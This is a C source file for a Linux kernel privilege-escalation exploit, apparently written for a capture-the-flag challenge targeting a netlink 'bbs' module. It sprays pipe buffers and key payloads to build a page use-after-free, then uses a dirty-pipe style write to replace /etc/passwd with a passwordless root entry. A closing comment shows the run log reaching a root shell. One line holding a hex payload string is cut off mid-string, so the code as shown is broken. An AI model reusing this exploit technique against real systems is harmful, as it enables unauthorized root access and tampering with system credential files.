#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <assert.h>
#include <sys/resource.h>

#include <linux/genetlink.h>
#include <libmnl/libmnl.h>
#define PWN_NAME "bbs"
#define CMD_ADD_TYPE  1
#define ADD_TYPE_NAME 1
#define ADD_TYPE_DATA 2

#define CMD_GET_TYPE_DUMPIT 2

#define CMD_DELE_TYPE  3
#define DELE_TYPE_NAME 1

#define CMD_ADD_TITLE        4
#define ADD_TITLE_TYPE_NAME  1
#define ADD_TITLE_TITLE_NAME 2
#define ADD_TITLE_DATA       3

#define CMD_EDIT_TITLE        5
#define EDIT_TITLE_TYPE_NAME  1
#define EDIT_TITLE_TITLE_NAME 2
#define EDIT_TITLE_DATA       3

#define CMD_DELE_TITLE        6
#define DELE_TITLE_TYPE_NAME  1
#define DELE_TITLE_TITLE_NAME 2

#define CMD_ADD_MSG        8
#define ADD_MSG_TYPE_NAME  1
#define ADD_MSG_TITLE_NAME 2
#define ADD_MSG_MSG_NAME   3
#define ADD_MSG_DATA       4

#define CMD_DELE_MSG        10
#define DELE_MSG_TYPE_NAME  1
#define DELE_MSG_TITLE_NAME 2
#define DELE_MSG_MSG_NAME   3

#define CMD_STAR_MSG        11
#define STAR_MSG_TYPE_NAME  1
#define STAR_MSG_TITLE_NAME 2
#define STAR_MSG_MSG_NAME   3
#define STAR_MSG_NUMS       7

#define REDS "\033[31m\033[1m"
#define REDE "\033[0m"
#define fail_exit(msg) { printf(REDS"[Error %s, %d line, %s]: %s\n"REDE, \
                __FUNCTION__, __LINE__, __FILE__, msg);\
                exit(-1); }


void err_exit(char *msg)
{
        puts(msg);
        sleep(2);
        exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

int key_alloc(char *description, char *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen,
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, char *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

uint32_t PWN_ID;
static int data_attr_cb(const struct nlattr *attr, void *data) {
        const struct nlattr **tb = data;
        int type = mnl_attr_get_type(attr);
        if (mnl_attr_type_valid(attr, CTRL_ATTR_MAX) < 0)
                return MNL_CB_OK;
        switch (type) {
                case CTRL_ATTR_FAMILY_NAME:
                        if (mnl_attr_validate(attr, MNL_TYPE_STRING) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
                case CTRL_ATTR_FAMILY_ID:
                        if (mnl_attr_validate(attr, MNL_TYPE_U16) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
                case CTRL_ATTR_VERSION:
                case CTRL_ATTR_HDRSIZE:
                case CTRL_ATTR_MAXATTR:
                        if (mnl_attr_validate(attr, MNL_TYPE_U32) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
                case CTRL_ATTR_OPS:
                case CTRL_ATTR_MCAST_GROUPS:
                        if (mnl_attr_validate(attr, MNL_TYPE_NESTED) < 0) {
                                perror("mnl_attr_validate");
                                return MNL_CB_ERROR;
                        }
                        break;
        }
        tb[type] = attr;
        return MNL_CB_OK;
}

static int data_cb(const struct nlmsghdr *nlh, void *data) {
        struct nlattr *tb[CTRL_ATTR_MAX + 1] = {};
        struct genlmsghdr *genl = mnl_nlmsg_get_payload(nlh);
        mnl_attr_parse(nlh, sizeof(*genl), data_attr_cb, tb);
        if (tb[CTRL_ATTR_FAMILY_NAME]) {
                printf("name=%s\t", mnl_attr_get_str(tb[CTRL_ATTR_FAMILY_NAME]));
        }
        if (tb[CTRL_ATTR_FAMILY_ID]) {
                PWN_ID = mnl_attr_get_u16(tb[CTRL_ATTR_FAMILY_ID]);
                printf("id=%u\t", PWN_ID);
        }
        if (tb[CTRL_ATTR_VERSION]) {
                printf("version=%u\t", mnl_attr_get_u32(tb[CTRL_ATTR_VERSION]));
        }
        if (tb[CTRL_ATTR_HDRSIZE]) {
                printf("hdrsize=%u\t", mnl_attr_get_u32(tb[CTRL_ATTR_HDRSIZE]));
        }
        if (tb[CTRL_ATTR_MAXATTR]) {
                printf("maxattr=%u\t", mnl_attr_get_u32(tb[CTRL_ATTR_MAXATTR]));
        }
        printf("\n");
        return MNL_CB_OK;
}

void get_family_id() {
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = GENL_ID_CTRL;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CTRL_CMD_GETFAMILY;
        genl->version = 1;
        mnl_attr_put_u32(nlh, CTRL_ATTR_FAMILY_ID, GENL_ID_CTRL);
        mnl_attr_put_strz(nlh, CTRL_ATTR_FAMILY_NAME, PWN_NAME);
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, seq, portid, data_cb, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1) {
                fail_exit("error");
        }
        mnl_socket_close(nl);
}

void add_type(char *type_name, char *data) {
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = PWN_ID;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CMD_ADD_TYPE;
        genl->version = 1;
        type_name[strlen(type_name)] = '\x00';
        if (strlen(data) > 128)
                data[128] = '\x00';
        else
                data[strlen(data)] = '\x00';

        mnl_attr_put_strz(nlh, ADD_TYPE_NAME, type_name);
        mnl_attr_put_strz(nlh, ADD_TYPE_DATA, data);
        if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1){
                perror("ERR");
                fail_exit("error");
        }
        mnl_socket_close(nl);
}

void add_title(char *type_name, char *title_name, char *data){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = PWN_ID;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CMD_ADD_TITLE;
        genl->version = 1;
        type_name[strlen(type_name)] = '\x00';
        title_name[strlen(title_name)] = '\x00';
        if (strlen(data) > 128)
                data[128] = '\x00';
        else
                data[strlen(data)] = '\x00';
        mnl_attr_put_strz(nlh, ADD_TITLE_TYPE_NAME, type_name);
        mnl_attr_put_strz(nlh, ADD_TITLE_TITLE_NAME, title_name);
        mnl_attr_put_strz(nlh, ADD_TITLE_DATA, data);
        if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1){
                perror("ERR");
                fail_exit("error");
        }
        mnl_socket_close(nl);
}

void add_msg(char *type_name, char *title_name, char *msg_name){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        struct genlmsghdr *genl;
        int ret;
        unsigned int seq, portid;
        nl = mnl_socket_open(NETLINK_GENERIC);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }
        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);
        nlh = mnl_nlmsg_put_header(buf);
        nlh->nlmsg_type = PWN_ID;
        nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
        nlh->nlmsg_seq = seq = time(NULL);
        genl = mnl_nlmsg_put_extra_header(nlh, sizeof(struct genlmsghdr));
        genl->cmd = CMD_ADD_MSG;
        genl->version = 1;
        type_name[strlen(type_name)] = '\x00';
        title_name[strlen(title_name)] = '\x00';
        msg_name[strlen(msg_name)] = '\x00';
        char msg[1024] = { 0 };
        strcpy(msg, "\x18\x2e\x86\x2a\x07\xa7\xb7\x08\x63\xbf\xdf\x0b\xd8\x36\xde\xdd\x5a\x48\xf5\x78\x23\x9f\xb8\x2c\x49\x66\xc7\xa0\xee\x3e\xee\x9c\x44\x2a\x92\x5a\x6a\xc7\xdf\x6;
        msg[strlen(msg)] = '\x00';
        mnl_attr_put_strz(nlh, ADD_MSG_TYPE_NAME, type_name);
        mnl_attr_put_strz(nlh, ADD_MSG_TITLE_NAME, title_name);
        mnl_attr_put_strz(nlh, ADD_MSG_MSG_NAME, msg_name);
        mnl_attr_put_strz(nlh, ADD_MSG_DATA, msg);
        if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
                perror("mnl_socket_sendto");
                exit(EXIT_FAILURE);
        }
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, seq, portid, NULL, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1){
                perror("ERR");
                fail_exit("error");
        }
        mnl_socket_close(nl);
}

void inc_limit()
{
    int ret;
    struct rlimit open_file_limit;

    ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);

    printf("[*] file limit: %ld\n", open_file_limit.rlim_max);

    open_file_limit.rlim_cur = open_file_limit.rlim_max;
    ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);
}

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
        struct page *page;
        unsigned int offset, len;
        const struct pipe_buf_operations *ops;
        unsigned int flags;
        unsigned long private;
};

void dirty_pipe() {
        #define SPRAY_PIPE_NUMS (450)
        int pipe_fd[SPRAY_PIPE_NUMS][2];
//      #define ATTACK_FILE "/bin/busybox"
        #define ATTACK_FILE "/etc/passwd"
        #define ATTACK_SPRAY_NUMS (200)
        #define SPRAY_KEYS_NUMS (75)
        int file_fd[ATTACK_SPRAY_NUMS];
        int pipe_fd_[ATTACK_SPRAY_NUMS][2];
        int key_id[SPRAY_KEYS_NUMS];
        char type_name[0x20+1] = { 0 };
        char title_name[0x40+1] = { 0 };
        char msg_name[0x100+1] = { 0 };
        char data[0x1000] = { 0 };
        char buf[0x1000] = { 0 };
        char desc[0x100] = { 0 };
        memset(data, 'A', 0x100);
        get_family_id();

        strcpy(type_name, "pwnType");
        add_type(type_name, data);
        puts("===================== check ====================");
        puts("[+] CHECK");
        system("id");
        system("ls -alh /etc/passwd");
        system("cat /etc/passwd");
        system("echo 'AAAA' > /etc/passwd");

        puts("===================== pwn ======================");
        puts("[+] Prepare some title objects");
        for (int i = 0; i < SPRAY_PIPE_NUMS; i++) {
                sprintf(title_name, "%s%d", "pwnTitle", i);
                add_title(type_name, title_name, data);
        }

        puts("[+] Spraying filp && pipe_buffer for dirty pipe");
        for (int i = 0; i < ATTACK_SPRAY_NUMS; i++) {
                file_fd[i] = open(ATTACK_FILE, O_RDONLY);
                if (file_fd[i] < 0) err_exit("open");
        }
        for (int i = 0; i < ATTACK_SPRAY_NUMS; i++) {
                if (pipe(pipe_fd_[i]) < 0) fail_exit("pipe");
//              write(pipe_fd_[i][1], "XiaozaYa", 8);
        }

        puts("[+] Spraying pipe_buffer to prepare for PAGE UAF");
        for (int i = 0; i < SPRAY_PIPE_NUMS; i++) {
                if (pipe(pipe_fd[i]) < 0) fail_exit("pipe");
        }
//      puts("[+] DEBUG");
//      getchar();

        puts("[+] Fcntl pipe_buffer to kmalloc-512 and alloc kmalloc-512 user_key_payload");
        int start = SPRAY_PIPE_NUMS - SPRAY_KEYS_NUMS;
        for (int i = 0; i < SPRAY_PIPE_NUMS; i++) {
                sprintf(desc, "XiaozaYa-%d", i);
                if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000*8) < 0) fail_exit("fcntl");
                write(pipe_fd[i][1], "XiaozaYa", 8);
                uint64_t nr = 0xdead0000+i;
                write(pipe_fd[i][1], &nr, 8);
                if (i >= start && i < SPRAY_KEYS_NUMS + start)
                        if ((key_id[i-start] = key_alloc(desc, buf, 248)) < 0) fail_exit("key_alloc");
        }
//      puts("[+] DEBUG");
//      getchar();

        puts("[+] Freeing kmalloc-512 user_key_payload to construct some holes");
        for (int i = 0; i < SPRAY_KEYS_NUMS; i++) {
                if (key_revoke(key_id[i]) < 0) fail_exit("key_revoke");
                if (key_unlink(key_id[i]) < 0) fail_exit("key_unlink");
        }
        sleep(2);
        uint64_t victim_idx   = -1;
        uint64_t original_idx = -1;

        puts("[+] Spraying msg to occupy and construct PAGE UAF");
        for (int i = 0; i < SPRAY_PIPE_NUMS; i++) {
                memset(title_name, 0, sizeof(title_name));
                memset(msg_name, 0, sizeof(msg_name));
                sprintf(title_name, "%s%d", "pwnTitle", i);
                sprintf(msg_name, "%s%d", "pwnMsg", i);
                add_msg(type_name, title_name, msg_name);
        }

        puts("[+] Check Hit or Not");
        for (int i = 0; i < SPRAY_PIPE_NUMS; i++) {
                char tag[0x10] = { 0 };
                uint64_t nr = -1;
                read(pipe_fd[i][0], tag, 8);
                read(pipe_fd[i][0], &nr, 8);
                if ((nr&0xffff0000) != 0xdead0000) continue;
//              printf("%#x-%#lx\n", i, nr);
//              puts(tag);
                if (!strcmp(tag, "XiaozaYa") && (nr-0xdead0000) != i) {
                        victim_idx = i;
                        original_idx = nr - 0xdead0000;
                        break;
                }
        }

        if (victim_idx == -1) fail_exit("So Bad");
        printf("[+] victim_idx: %ld\n", victim_idx);
        printf("[+] original_idx: %ld\n", original_idx);
        memset(buf, 'A', sizeof(buf));
        write(pipe_fd[victim_idx][1], buf, 192+sizeof(struct pipe_buffer));
        read(pipe_fd[victim_idx][0], buf, 192);

        close(pipe_fd[original_idx][0]);
        close(pipe_fd[original_idx][1]);
        puts("[+] Fcntl attack_pipe to kmalloc-512 and occupy UAF PAGE");
        for (int i = 0; i < ATTACK_SPRAY_NUMS; i++) {
                if (fcntl(pipe_fd_[i][1], F_SETPIPE_SZ, 0x1000*4) < 0) fail_exit("fcntl");
        }

        for (int i = 0; i < ATTACK_SPRAY_NUMS; i++) {
                loff_t offset = 1;
                if (splice(file_fd[i], &offset, pipe_fd_[i][1], NULL, 1, 0) <= 0) fail_exit("fcntl");
        }

        memset(buf, 0, sizeof(buf));
        struct pipe_buffer evil_buf;
        puts("[+] Spraying some kmalloc-512 user_key_payload to occupy the rest objects");
        memset(desc, 0, sizeof(desc));
        for (int i = 0; i < SPRAY_KEYS_NUMS / 2; i++) {
                sprintf(desc, "GO-%d", i);
                if ((key_id[i] = key_alloc(desc, buf, 248)) < 0) fail_exit("key_alloc");
        }

        uint64_t page_ops = 0xffffffff82227860;
        read(pipe_fd[victim_idx][0], &evil_buf, sizeof(struct pipe_buffer));
        if (((uint64_t)evil_buf.ops&0xffffffff00000fff) != (page_ops&0xffffffff00000fff)) {
                fail_exit("So Bad");
        }

        printf("[======= dump page    =====] %p\n",  evil_buf.page);
        printf("[======= dump offset  =====] %d\n",  evil_buf.offset);
        printf("[======= dump len     =====] %d\n",  evil_buf.len);
        printf("[======= dump ops     =====] %p\n",  evil_buf.ops);
        printf("[======= dump flags   =====] %#x\n", evil_buf.flags);
        printf("[======= dump private =====] %ld\n", evil_buf.private);

        int evil_idx = evil_buf.offset - 1;

//      getchar();
//      memset(buf, '\x00', sizeof(buf));
        evil_buf.offset = 0;
        evil_buf.len = 0;
        evil_buf.flags = 0x10;
        write(pipe_fd[victim_idx][1], &evil_buf, sizeof(struct pipe_buffer));
        char *cmd = "root::0:0:root:/root:/bin/sh\x00";
        for (int i = 0; i < ATTACK_SPRAY_NUMS; i++) {
                if (write(pipe_fd_[i][1], cmd, strlen(cmd)+1) < 0) fail_exit("write pipe")
        }
        puts("===================== root =====================");
        puts("So cool~~~");
        system("cat /etc/passwd");
        system("su root");
        puts("EXP NERVER END!");
//      while(1) {}
}

int main() {
        bind_core(0);
        inc_limit();
        setbuf(stdout, 0);
        dirty_pipe();
        return 0;
}

/*
~ $ ./exploit
[*] Process binded to core 0
[*] file limit: 4096
name=bbs        id=32   version=1       hdrsize=0       maxattr=0
===================== check ====================
[+] CHECK
uid=1000(note) gid=1000 groups=1000
-rw-r--r--    1 root     1000          69 Oct 27  2023 /etc/passwd
root:x:0:0:root:/root:/bin/sh
note:x:1000:1000:ctf:/home/ctf:/bin/sh
sh: can't create /etc/passwd: Permission denied
===================== pwn ======================
[+] Prepare some title objects
[+] Spraying filp && pipe_buffer for dirty pipe
[+] Spraying pipe_buffer to prepare for PAGE UAF
[+] Fcntl pipe_buffer to kmalloc-512 and alloc kmalloc-512 user_key_payload
[+] Freeing kmalloc-512 user_key_payload to construct some holes
[+] Spraying msg to occupy and construct PAGE UAF
[+] Check Hit or Not
[+] victim_idx: 393
[+] original_idx: 107
[+] Fcntl attack_pipe to kmalloc-512 and occupy UAF PAGE
[+] Spraying some kmalloc-512 user_key_payload to occupy the rest objects
[======= dump page    =====] 0xffffe8ad400831c0
[======= dump offset  =====] 1
[======= dump len     =====] 1
[======= dump ops     =====] 0xffffffff86a27860
[======= dump flags   =====] 0
[======= dump private =====] 0
===================== root =====================
So cool~~~
root::0:0:root:/root:/bin/sh
note:x:1000:1000:ctf:/home/ctf:/bin/sh
/home/ctf # id
uid=0 gid=0 egid=1000 groups=0
/home/ctf #
*/
